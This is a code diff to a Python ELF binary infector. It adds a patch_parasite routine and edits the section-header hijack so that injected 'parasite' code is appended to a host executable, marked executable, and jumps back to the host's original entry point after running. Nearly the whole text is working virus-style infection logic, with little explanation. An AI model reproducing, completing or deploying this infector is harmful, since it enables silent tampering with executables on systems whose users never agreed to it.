@@ -39,6 +39,30 @@ def write_at_addr(fd, addr, data):
     fd.seek(addr)
     fd.write(data)
 
+def patch_parasite(host_binary):
+    parasite_fd = open(PARASITE_BINARY, "rb+")
+    host_fd = open(host_binary, "rb")
+    entry_point, = struct.unpack("<Q", read_bytes_at(host_fd, E_ENTRY_OFFSET, 8))
+    s = parasite_fd.read()
+    host_fd.read()
+    injected_addr = host_fd.tell()
+    print("injected_addr", injected_addr)
+    injected_load_addr = align(0x800000, injected_addr)
+    ret_offset = s.find(b'\xe8\x00\x00\x00\x00\x59')
+    ret_offset += 5
+    rel_addr_offset = ret_offset + 4
+    print("injected load addr", injected_load_addr)
+    relative_offset = (injected_load_addr + ret_offset) - entry_point
+    print("$$$$$$$$")
+    print(hex(entry_point))
+    print("offset", rel_addr_offset)
+
+    print("relative offset", hex(relative_offset))
+
+    print("relative offset bytes", relative_offset.to_bytes(4, byteorder='little'))
+
+    write_at_addr(parasite_fd, rel_addr_offset, relative_offset.to_bytes(4, byteorder='little'))
+
 def inject(host_binary):
     fd = open(PARASITE_BINARY, "rb")
     content = fd.read()
@@ -59,8 +83,8 @@ def infect_section_header(fd, injected_addr):
     write_at_addr(fd, abi_tag_header_offset + SHT_TYPE_OFFSET, b'\x01\x00\x00\x00')
 
     # change SH_ADDR to injected_addr
-    d = align(0x800000, injected_addr).to_bytes(8, byteorder='little')
-    write_at_addr(fd, abi_tag_header_offset + SHT_ADDR_OFFSET, d)
+    injected_load_addr = align(0x800000, injected_addr)
+    write_at_addr(fd, abi_tag_header_offset + SHT_ADDR_OFFSET, injected_load_addr.to_bytes(8, byteorder='little'))
 
     # change sh_size to size of injected code
     injected_size = os.stat(PARASITE_BINARY).st_size
@@ -78,6 +102,10 @@ def infect_section_header(fd, injected_addr):
     # add executable flag
     d = (6).to_bytes(8, byteorder='little')
     write_at_addr(fd, abi_tag_header_offset + SHT_FLAGS_OFFSET, d)
+
+    # compute PC relative offset and update parasite binary to 
+    # to return to _start code
+    
 
 
 def infect_program_header(fd, injected_addr):
@@ -127,6 +155,8 @@ def main():
         return
         
     host_binary = sys.argv[1]
+    
+    patch_parasite(host_binary)
 
     fd = open(host_binary, "rb+")
     # Append the bytes to the end of the target binary
